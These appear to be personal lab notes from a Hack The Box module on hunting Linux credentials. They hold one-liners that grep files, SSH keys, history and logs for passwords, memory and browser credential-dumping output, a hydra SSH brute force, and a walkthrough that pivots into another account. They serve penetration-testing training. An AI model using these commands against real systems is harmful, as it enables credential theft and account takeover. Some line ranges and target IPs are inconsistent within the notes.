
##### Configuration Files
```go
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

##### Credentials in Configuration Files
```go
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

##### Databases
```go
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

##### Credentials in Notes
```go
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

##### Credentials in Scripts
```go
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

##### Cronjobs
```go
ls -la /etc/cron.*/
```

##### SSH Keys

**Private Keys**
```go
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

**Public Keys**
```go
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

##### Bash History
```go
 tail -n5 /home/*/.bash*
```

##### Logs
```go
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

##### Memory and Cache

**Memory - Mimipenguin**
https://github.com/huntergregal/mimipenguin


```go
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

Lazagne
https://github.com/AlessandroZ/LaZagne

```go
sudo python2.7 laZagne.py all
```

##### Browsers

Firefox
```go
ls -l .mozilla/firefox/ | grep default 
```

```go
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

[Firefox Decrypt](https://github.com/unode/firefox_decrypt) can be used to decrypt the credentials. The latest version requires Python 3.9, else Python 2

Example Usage
```go
datboyblu3@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Lazagne can also collect passwords in browsers
```go
python3 laZagne.py browsers
```

## Questions

Target
```go
10.129.241.137
```

1) Examine the target and find out the password of the user Will. Then, submit the password as the answer.


Nmap results:
```go
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-12T20:58:39
|_  start_date: N/A
|_nbstat: NetBIOS name: NIX01, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds

```

Generate a list of mutated passwords
```go
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

The hint tells us that the user `Kira` has a password of `LoveYou1`. From the mutated list, grab all passwords that are similar to this password. The first Instance starts at line 42523 to line 52538. Put these in a separate list called `kiras_passwds_list`
```go
sed -n '49006,52538 p' mut_password.list > kiras_passwds_list.txt
```

This can also be done in vi/vim:
```go
:42523,52538w!/tmp/kiras_passwds_list.txt
```

Brute force SSH via hydra
```go
hydra -l kira -P kiras_new_passwds_list.txt ssh://10.129.240.214
```

Password found:
```go
L0vey0u1!
```

![[Pasted image 20250512214626.png]]

### Pivoting in Kira's account

SSH
```go
ssh kira@10.129.218.247
```

Transfer LaZagne to Kira
```go
scp -r firefox_decrypt-1.1.1.zip kira@10.129.218.247:/tmp
```

Executed firefox decrypt on Kira's machine:
![[Pasted image 20250513072313.png]]

Password:
```go
TUqr7QfLTLhruhVbCP
```

Username:
```go
will@inlanefreight.htb
```

Website:
```go
https://dev.inlanefreight.com
```